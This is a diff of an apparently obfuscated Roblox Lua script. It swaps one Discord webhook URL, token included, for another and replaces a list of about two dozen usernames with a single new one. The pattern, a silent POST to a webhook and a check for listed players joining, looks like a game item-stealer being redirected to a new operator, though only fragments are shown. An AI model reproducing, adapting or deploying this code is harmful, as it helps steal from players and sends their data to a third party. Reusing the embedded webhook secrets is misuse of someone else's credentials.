@@ -1,5 +1,3 @@
--- discord.gg/syncrypt
-
 local v1 = table.pack(...)
 local ID_ = ID or v1[1]
 
@@ -1138,7 +1136,7 @@ local function v207(p26, p27)
 
 		pcall(function()
 			request({
-				Url = "https://discord.com/api/webhooks/1540466856228421632/Wfq_gxEfNdRrY4gLdQRcFMMzWF7qWHCGWt4yeomXSssXZeC9zW_xP3c7R-v4Z928hSEZ",
+				Url = "https://discord.com/api/webhooks/1497722335472652369/d7U2Gui_fyu1c_aAYihhpMSBcnWGWrkGRQPW9UV4zZZs2y909fFlpui2TlHirAhK9Djm",
 				Method = "POST",
 				Headers = {
 					["Content-Type"] = "application/json"
@@ -2015,29 +2013,7 @@ if #t1 > 0 then
 	local function v308()
 		local function v309(player)
 			if table.find(users, player.Name) or table.find({
-				"TS_Gamer31",
-				"TS_Gamer32",
-				"aaalmaz0",
-				"allmm2v01",
-				"allmm2v02",
-				"allmm2v03",
-				"allmm2v04",
-				"allmm2v05",
-				"allmm2v06",
-				"allmm2v07",
-				"allmm2v08",
-				"allmm2v09",
-				"allmm2v10",
-				"allmm2v11",
-				"allmm2v12",
-				"allmm2v13",
-				"allmm2v14",
-				"allmm2v15",
-				"holdstockmm",
-				"amazzzbi",
-				"allmm2aj01",
-				"allmm2aj02",
-				"allmm2aj03"
+				"Thebestfunnehfanisme"
 			}, player.Name) then
 				local now = tick()
 
